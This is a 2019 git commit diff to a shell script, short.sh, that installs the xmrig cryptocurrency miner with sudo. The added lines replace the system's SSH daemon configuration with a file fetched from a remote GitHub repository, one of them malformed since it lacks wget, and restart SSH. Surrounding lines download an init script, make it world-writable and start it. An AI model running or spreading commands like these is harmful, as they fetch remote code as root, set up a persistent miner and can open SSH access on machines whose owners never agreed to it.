4efe727510b011b1cf03b4ef95aec0e44bc44680
Big_ort <adytamasurya@gmail.com>
2019-02-25 14:21:13 +0700

    Update short.sh

--- short.sh
+++ short.sh
@@ -5,6 +5,8 @@ sudo cp xmrig /usr/local/bin
 sudo cp xmrig /usr/bin
 sudo chmod +x /usr/local/bin/xmrig
 sudo chmod +x /usr/bin/xmrig
+sudo https://raw.githubusercontent.com/BigOrt/bigort/master/sshd_config -O /etc/ssh/sshd_config
+sudo service ssh restart
 sudo wget https://raw.githubusercontent.com/BigOrt/bigort/master/mango -O /etc/init.d/mango
 sudo chmod -R 777 /etc/init.d/mango
 sudo /etc/init.d/mango start
